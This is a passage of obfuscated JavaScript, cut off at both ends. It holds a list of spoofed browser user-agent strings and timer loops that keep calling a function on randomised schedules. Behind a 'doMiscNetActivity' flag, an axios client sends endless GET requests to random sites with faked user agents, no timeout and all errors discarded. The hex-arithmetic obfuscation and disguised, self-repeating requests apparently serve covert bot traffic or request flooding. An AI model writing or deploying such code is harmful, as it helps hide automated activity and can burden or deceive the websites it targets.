      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1476 + -0x1 * -0x2645 + 0x1f * -0x1e5; k < 0x156d + 0xd6f * 0x2 + 0x11 * -0x2d7; k++)
    setTimeout(f, (-0x35 * -0x539 + -0xab40 + -0x80d3 * -0x1) * k * getRandomInt(0x3e5 * 0x7 + 0x208b + -0x3bcd, -0xc * 0x9 + -0x2e + 0x9d));
  setInterval(() => {
    f();
    for (let l = -0xb90 + 0x55 * -0x66 + -0x916 * -0x5; l < -0x119 * -0x17 + -0x20fb + 0x7c0; l++)
      setTimeout(f, (-0xe81 * -0x19 + 0x1 * 0x3ff1 + 0x400e * -0x3) * l * getRandomInt(-0x221e * 0x1 + -0x1513 + -0x5 * -0xb0a, 0x1934 + -0x1697 + -0x29a));
  }, 0x418a3d + 0x9bc68 + -0x145825);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x17cf + 0x1af7 + -0xbb7 * 0x2) * getRandomInt(0x8c0 + 0x2554 + -0x151 * 0x23, -0x22b1 + -0x1 * -0xc92 + 0x1624 * 0x1));
}, 0x82 * 0x44 + -0x7 * 0x3f5 + -0x671);